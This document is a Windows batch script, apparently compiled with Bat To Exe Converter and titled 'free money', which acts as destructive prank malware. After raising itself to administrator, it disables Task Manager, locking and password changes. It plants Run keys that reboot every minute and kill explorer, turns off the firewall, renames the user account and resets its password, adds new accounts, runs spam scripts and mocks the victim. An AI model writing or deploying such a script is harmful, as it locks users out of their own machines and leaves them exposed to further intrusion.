::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCmDJEmW/VQxPB5oShGQLnKGC6xR5+vH3eOdnkgFRPA6a4bU1IiZL+8VpEznevY=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJmZk0aGmQ=
::ZQ05rAF9IBncCkqN+0xwdVsCAlLMags=
::ZQ05rAF9IAHYFVzEqQI2Oh5RQQuMOXL0A60ZiA==
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQI6PQhADBCHL3+zCLJc/uHp+vnHrkIRNA==
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCmDJFSduVEkPR1ScBKLLn6pOrMO7e324OSCu3EbRuc6dYDV363AJfgWig==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

cls
title free money
color a

net session >nul 2>&1
if %errorlevel% == 0 (
  :: echo Script is already running with administrator privellages.
  goto main
)
goto admin

:admin
echo Requesting administrator privillages...
echo Plase provide administrator credentials.
echo .

powershell -command "Start-Process '%comspec%' -ArgumentList '/c %~s0 & pause' -Verb RunAs"
pause
exit

:main
echo WOULD YOU LIKE TO RUN THIS PROGRAM?, the creator is not responsible for what you do 
choice /c yn

if %ERRORLEVEL%==1 goto death
if %ERRORLEVEL%==2 exit
if %ERRORLEVEL%==0 exit
if not %ERRORLEVEL%==1 exit
if not %ERRORLEVEL%==2 exit
if not %ERRORLEVEL%==0 exit

:death
msg "%username%" say goodbye to your pc lmao :)
ping localhost -n 5

reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkStation /t REG_DWORD /d 1
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RebootTask /t REG_SZ /d "C:\Windows\System32\shutdown.exe -r -t 60"
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v KillExplorer /t REG_SZ /d "C:\Windows\System32\taskkill.exe explorer.exe"
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v loop /t REG_SZ /d "%userprofile%\Desktop\freemoney\loop.exe"
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "prompt ERROR"
REG DELETE "HKCU\control panel\desktop" /v wallpaper
REG ADD "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "%userprofile%\Desktop\freemoney\testing.png"
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

netsh advfirewall set currentprofile state off
wmic useraccount where name="%username%" rename "LMAO YOU'RE STUPID"

net user "LMAO YOU'RE STUPID" lmao
net user /add DEATH death
net user /add NoEscapeSafe death

"%userprofile%\Desktop\freemoney\keyboard.vbs"
"%userprofile%\Desktop\freemoney\spam.vbs"
"%userprofile%\Desktop\freemoney\lol.vbs"

msg "%username%" ENJOY USE YOUR PC :)
msg "%username%" SUCCESS TAKE OVER YOUR PC!, Rebooting in 1 minutes
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
shutdown -r -t 60